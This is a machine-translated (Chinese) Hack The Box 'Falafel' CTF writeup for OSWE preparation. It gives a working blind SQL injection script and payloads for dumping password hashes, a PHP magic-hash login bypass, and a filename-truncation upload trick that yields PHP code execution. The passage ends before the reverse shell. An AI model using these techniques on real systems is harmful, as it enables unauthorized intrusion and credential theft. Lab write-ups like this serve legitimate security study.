<html>
<head>
<title>[HTB] Falafel — Writeup (OSWE-Prep)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]沙拉三明治——报道(OSWE预科)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-falafel-writeup-oswe-prep-3b8b56b64076?source=collection_archive---------3-----------------------#2021-04-12">https://infosecwriteups.com/htb-falafel-writeup-oswe-prep-3b8b56b64076?source=collection_archive---------3-----------------------#2021-04-12</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/8cca95bb66fd59b0709d9654bf9d9a96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1072/format:webp/1*EV1R5nhSVGqSDkiovGL2uw.png"/></div></figure><p id="3862" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">沙拉三明治是一个很难的Linux盒子。非常好的学习途径:</p><ul class=""><li id="0473" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">基于布尔的盲信号</li><li id="755d" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">PHP类型杂耍攻击(松散比较弱点/魔法散列)</li><li id="05be" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">上传PHP脚本的文件名截断攻击</li><li id="faf5" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">Linux帧缓冲区(<code class="fe lj lk ll lm b">video</code>组特权)</li><li id="2c8c" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">Linux文件系统调试(<code class="fe lj lk ll lm b">disk</code>组权限)</li></ul></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h1 id="2918" class="lu lv it bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">初步侦察</h1><h2 id="aab4" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">Nmap</h2><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="177f" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu"># nmap -Pn --open -T4 -sV -sC -p- 10.10.10.73</strong></span><span id="1757" class="ms lv it lm b gy nq nn l no np">Starting Nmap 7.80 ( <a class="ae nr" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-04-10 20:40 EDT<br/>Nmap scan report for 10.10.10.73<br/>Host is up (0.081s latency).<br/>Not shown: 65533 closed ports<br/>PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)<br/>|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)<br/>|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)<br/><strong class="lm iu">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</strong><br/>| http-robots.txt: 1 disallowed entry <br/>|_/*.txt<br/>|_http-server-header: Apache/2.4.18 (Ubuntu)<br/>|_http-title: Falafel Lovers<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><ul class=""><li id="b093" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated"><strong class="jz iu"> HTTP (80/TCP) </strong> —一个沙拉爱好者的网页。</li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ns"><img src="../Images/0303f76bb86aa02cee3bd9259c1ba734.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gGX7A3KC8OS9XdVugtsMlA.png"/></div></div></figure><h2 id="9e25" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">Web目录枚举(Gobuster)</h2><p id="ebf3" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">像往常一样，我运行了一个快速的<code class="fe lj lk ll lm b">gobuster</code>,看看能否在网络服务器上发现更多有趣的文件/文件夹。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="3ddc" class="ms lv it lm b gy nm nn l no np"># gobuster dir -u <a class="ae nr" href="http://10.10.10.73" rel="noopener ugc nofollow" target="_blank">http://10.10.10.73</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/ebe1a9e95f3628ab293c77080a8ab974.png" data-original-src="https://miro.medium.com/v2/resize:fit:1316/format:webp/1*71w3HvoVWzSCdu3ZZJl1bg.png"/></div></figure><ul class=""><li id="d263" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated"><code class="fe lj lk ll lm b">/cyberlaw.txt</code> —看起来像电子邮件的有趣文本页面。它还透露了一个潜在的用户名<code class="fe lj lk ll lm b">chris</code>。</li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi od"><img src="../Images/e7624fe5e02e229d751aec425f005012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*md0bydVqHyHjDEoN6rUzEg.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated"><a class="ae nr" href="http://10.10.10.73/cyberlaw.txt" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 10 . 73/cyber law . txt</a></figcaption></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h1 id="ad64" class="lu lv it bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">最初的立足点</h1><h2 id="2977" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">SQL注入(基于布尔的盲注入)</h2><p id="48fd" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">因为除了一个登录表单之外没有什么，所以我想做一些潜在的SQLi检查。我通过Burp捕获了登录帖子请求，并将其发送给了<code class="fe lj lk ll lm b">sqlmap</code>。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/72c66d0df028ea63114316e86a3848d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*EYaTBbvYkh_dBqP_nr9F1w.png"/></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/d0c95e1337dcf545bd0ccb0c1915f718.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*NXHC_aWLjZNcIORLIw2BeA.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">登录发布请求</figcaption></figure><h2 id="65c5" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">SQLMap尝试#1</h2><p id="f170" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">当我刚刚将登录请求与SQLMap一起使用时，它没有找到任何东西。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="12f2" class="ms lv it lm b gy nm nn l no np"># sqlmap -r login.req --level 5 --risk 3 --batch</span></pre><p id="17c9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当SQLMap运行时，我注意到登录表单中不同的服务器响应。</p><ul class=""><li id="0dc4" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">有效用户=错误标识:<valid username=""/></li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ok"><img src="../Images/7c664cc85b3eb67a4f1b4582c0c7530f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iyT8xxS7--1pkVNy62GTbw.png"/></div></div></figure><ul class=""><li id="0108" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">无效用户=重试..</li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ol"><img src="../Images/e1c6bff522cd79dd8821c40d7b49fb6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kAdqgDTWEEaA4QUCWgKJqg.png"/></div></div></figure><ul class=""><li id="0154" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">一些SQLi企图=检测到黑客企图！</li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi om"><img src="../Images/5d044fbfd9ec0ed49dccdbe4865d0c1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mHspEf7IToB97mKz4Arqnw.png"/></div></div></figure><p id="19e4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这可能很有趣，因为如果<code class="fe lj lk ll lm b">username=</code>参数易受SQLi攻击，我们可以使用这些不同的服务器响应来读取数据库。</p><p id="c3c5" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">所以基本上，如果为真，我们会得到“错误识别”的响应，如果为假，我们会得到“再试一次”的响应。</p><h2 id="3042" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">SQLMap尝试#2</h2><p id="ba66" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我给SQLMap添加了<code class="fe lj lk ll lm b">--string</code>标志来证实我的理论。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="60ed" class="ms lv it lm b gy nm nn l no np"># sqlmap -r login.req --level 5 --risk 3 --batch <strong class="lm iu">--string "Wrong identification"</strong></span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi on"><img src="../Images/571f9d50bd747c3611e3750a3972dc13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NsQTWC2RNJbqjJXw-yYmgg.png"/></div></div></figure><p id="9f46" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">酷毙了。它发现了漏洞参数为<code class="fe lj lk ll lm b">username=</code>，还发现了后端数据库为MySQL 5。让我们看看是否可以滥用它从数据库中检索密码散列。</p><p id="f026" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我使用了以下有效载荷来确认我们是否能够识别出<code class="fe lj lk ll lm b">chris</code>用户密码的正确起始字符:</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="5561" class="ms lv it lm b gy nm nn l no np">username=chris<strong class="lm iu">' and password like 'a%'-- -</strong>&amp;password=password</span></pre><ul class=""><li id="8115" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">如果<code class="fe lj lk ll lm b">chris</code>密码以字母<code class="fe lj lk ll lm b">a</code>开头= TRUE语句</li><li id="097d" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">如果<code class="fe lj lk ll lm b">chris</code>密码<strong class="jz iu">不是以字母<code class="fe lj lk ll lm b">a</code>开头的</strong>=错误声明</li></ul><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi oo"><img src="../Images/32488c4585f9274d5304952fd07e949c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Px0hLzs7g09A2Qn7TRxz5A.png"/></div></div></figure><p id="57de" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">所以接下来，我用Burp的闯入者迭代字母表字符集:</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi op"><img src="../Images/f28500c9cd6535a5e90ac3a1eade82ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EVqbAUMEyXRsirDmvSMXUA.png"/></div></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi oq"><img src="../Images/bf77801a44271985579d04ad33cb4d61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x5bvMMg2wgZ4qjBFtmpliw.png"/></div></div></figure><h2 id="3827" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">获取chris密码哈希</h2><p id="0581" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">不错:)我想我们找到了。我们现在可以创建一个自定义脚本来检索密码哈希。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="f7ef" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu"># falafel_sqli.py</strong></span><span id="21b5" class="ms lv it lm b gy nq nn l no np">import requests<br/>import sys</span><span id="31cd" class="ms lv it lm b gy nq nn l no np">def username_sqli(ip, username):<br/>    for i in range(1,33): <br/>        for j in range(32,126):<br/>            payload = "%s' and substring(password,%s,1) = '%s'-- -" % (username,i,chr(j))<br/>            data = {'username':payload, 'password':'password'}<br/>            #print(data)<br/>            r = requests.post('http://%s/login.php' % ip, data = data)<br/>            if "Wrong identification" in r.text:<br/>                char = str(chr(j))<br/>                if char &gt;='A' and char &lt;= 'Z':<br/>                    continue<br/>                else:<br/>                    sys.stdout.write(char)<br/>                    sys.stdout.flush()</span><span id="beef" class="ms lv it lm b gy nq nn l no np">def main():<br/>    if len(sys.argv) != 3:<br/>        print("[INFO] Usage: %s &lt;Target&gt; &lt;Username&gt;" % sys.argv[0])<br/>        print("[INFO] Example: %s 10.10.10.73 chris" % sys.argv[0])<br/>        sys.exit()</span><span id="29ed" class="ms lv it lm b gy nq nn l no np">ip = sys.argv[1]<br/>username = sys.argv[2]</span><span id="16bd" class="ms lv it lm b gy nq nn l no np">print("[INFO] Username: %s" % username)<br/>    print("[INFO] MySQL Dumping Password Hash...")<br/>    username_sqli(ip, username)<br/>    print("\n[INFO] Done!")</span><span id="907a" class="ms lv it lm b gy nq nn l no np">if __name__ == "__main__":<br/>    main()</span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi or"><img src="../Images/6228b0f3d6b1900fd2923f07e88390c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*SyBbChcfu8r4Zn3pRmRsoQ.png"/></div></figure><p id="eedc" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">不错！现在，我们使用hashcat破解检索到散列，它破解了密码:<code class="fe lj lk ll lm b">chris : juggling</code></p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="3531" class="ms lv it lm b gy nm nn l no np"># hashcat -a 0 -m 0 chris.hash /usr/share/wordlists/rockyou.txt --force</span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi os"><img src="../Images/a1f727c1e50275ec820121adcd7870dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*amFXxclSXMUAeHph-YaJYw.png"/></div></figure><p id="3123" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">现在我以<code class="fe lj lk ll lm b">chris</code>的身份成功登录</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ot"><img src="../Images/96b7bb6e2a0dabf3ce2b3933e1c8609c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iUqw79RVhLGSrVaA51mlCQ.png"/></div></div></figure><blockquote class="ou ov ow"><p id="2432" class="jx jy ox jz b ka kb kc kd ke kf kg kh oy kj kk kl oz kn ko kp pa kr ks kt ku im bi translated">您可以使用命令:<code class="fe lj lk ll lm b"># sqlmap -r login.req — level 5 — risk 3 — batch — string “Wrong identification” — dbms mysql — dump</code>通过SQLMap完成所有这些SQLi攻击，但是不使用自动化工具总是很有趣:)</p></blockquote><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/346b2371015df1bd6c7898e0ebe854d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*YypW7iBZ4n4aDN4VvDXBDw.png"/></div></figure><p id="46da" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">但是在以<code class="fe lj lk ll lm b">chris</code>的身份登录后，那里什么也没有。但是在他的文章中，他一直提到“杂耍”,这可能意味着我们的下一个挑战:PHP类型杂耍。</p></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h2 id="1ffd" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">PHP类型杂耍(管理帐户接管)</h2><p id="99c8" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">使用相同的脚本，我检索了<code class="fe lj lk ll lm b">admin</code>用户的密码散列。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/b4c85987c2a25e681e4a0337a75fee11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1318/format:webp/1*6T14TS_34nsroI6MIvaiSw.png"/></div></figure><p id="c4ee" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我注意到<code class="fe lj lk ll lm b">admin</code>密码散列以<code class="fe lj lk ll lm b">0e...</code>开始，这表明我们可以通过滥用PHP松散的比较弱点来绕过认证。</p><h2 id="cb23" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">魔法哈希</h2><p id="0750" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">因为我们知道散列是MD5，我从这个网站找到了它的神奇散列。Magic hash的工作原理是与其他hash发生冲突，这两个hash都被视为“0”，因此比较结果为<strong class="jz iu">真</strong>。如果你想了解更多PHP类型杂耍，我推荐<a class="ae nr" href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf." rel="noopener ugc nofollow" target="_blank">这个</a>。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pd"><img src="../Images/0a3773e9f041c61c518798274e7d14f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MCFrTdbPH9yI14-4t-bD6g.png"/></div></div></figure><p id="4122" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用密码作为<code class="fe lj lk ll lm b">240610708</code>，我成功地以<code class="fe lj lk ll lm b">admin</code>用户的身份登录。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pe"><img src="../Images/1d7b808744496272c09bbf711444a9ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DPPT4arRxEju0GE4vtPV1g.png"/></div></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pf"><img src="../Images/ddfa127bebcc839e2e4333295a2855f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H2TL1wMMTUU3RWm8mUrxAQ.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">管理员配置文件</figcaption></figure><p id="821d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><code class="fe lj lk ll lm b">Admin</code>还有上传功能。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pg"><img src="../Images/649aad1f45bd4ae46475b24e18ddf29d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d0E1b7QjHCT8NuTscSqJ1g.png"/></div></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h2 id="55d1" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">上传PHP反向外壳</h2><p id="024a" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我做了一些快速测试，看看这个<code class="fe lj lk ll lm b">/upload.php</code>在做什么。当我输入<code class="fe lj lk ll lm b">http://&lt;My Kali IP&gt;/test.png</code>时，我得到了下面的详细错误。(*注意:使用其他文件类型如<code class="fe lj lk ll lm b">.php</code>受到限制)</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ph"><img src="../Images/0b0d934bacabdd105c3bba3774bc4753.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rh1_rzbh_cyPnAgl0KyPiQ.png"/></div></div></figure><p id="844b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它试图从我的卡利盒子里取出文件。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/74bf77f434db984a53627cef49de67aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1178/format:webp/1*cjph8PRU-tO4CmwghQmWMA.png"/></div></figure><h2 id="2e10" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">文件名截断</h2><p id="541d" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我注意到，如果我试图上传一个文件名非常长的文件，它会抱怨“文件名太长”。让我们试着控制文件名长度，看看我们是否可以上传<code class="fe lj lk ll lm b">.php</code>文件。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pj"><img src="../Images/3995c56a664a1fd2dde74fbc9b44d6da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L6IToafa2MrxJlMCFcXqEw.png"/></div></div></figure><p id="18a5" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">另一件有趣的事情来自上面的服务器响应是<em class="ox">“试图缩短…\n新名字是“</em>的一部分。由于长度限制，它基本上是重写文件名。:)</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pk"><img src="../Images/237d20bf3b248fe6af52f938bfb02e23.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*Zdo5_H77k8Qni65ufP5_7g.png"/></div></div></figure><p id="335e" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我计算新文件名的长度时，它是236。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pl"><img src="../Images/b036910e06b2311b1de2a2c1fe42bbaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NW_hWfzIDJxlRypU4zHhMA.png"/></div></div></figure><p id="f4a6" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">所以…</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="c9e9" class="ms lv it lm b gy nm nn l no np"><a class="ae nr" href="http://10.10.14.12" rel="noopener ugc nofollow" target="_blank">http://10.10.14.12</a> + <strong class="lm iu">&lt;236 Character Allowed for Filename&gt;</strong> + .png</span></pre><p id="12dc" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">让我们试试下面的方法，看看我们能否上传一个<code class="fe lj lk ll lm b">.php</code>文件:</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="85aa" class="ms lv it lm b gy nm nn l no np">python -c 'print("<a class="ae nr" href="http://10.10.14.12/" rel="noopener ugc nofollow" target="_blank">http://10.10.14.12/</a>" + <strong class="lm iu">"A"*233 + ".php"</strong> + ".png")'</span><span id="13a6" class="ms lv it lm b gy nq nn l no np">http://10.10.14.12/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png</span></pre><p id="ac25" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在发送有效载荷之前，让我们用这个名字创建一个文件，并把它放在我们的web服务器上。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pm"><img src="../Images/f33480573d27ce370258533e06644585.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DtWB6HP44q2li2ZkrtM6vA.png"/></div></div></figure><p id="534b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我发送有效载荷时，它看起来很有希望:)</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pn"><img src="../Images/926187cdf32374b0314013fe1af0ef09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W63p98hsf6yMNCV2IG68lA.png"/></div></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi po"><img src="../Images/a0eae9f7609b099b7919b8ae20f07776.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zYvj_EvqwI9L319YZMS7ZQ.png"/></div></div></figure><p id="df37" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我检查上传的网址，我成功地获得任意PHP代码执行。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="81e4" class="ms lv it lm b gy nm nn l no np"><a class="ae nr" href="http://10.10.10.73/uploads/0412-0010_dbe09fe3603f833a/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php" rel="noopener ugc nofollow" target="_blank">http://10.10.10.73/uploads/0412-0010_dbe09fe3603f833a/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php</a></span></pre><figure class="ne nf ng nh gt ju gh gi 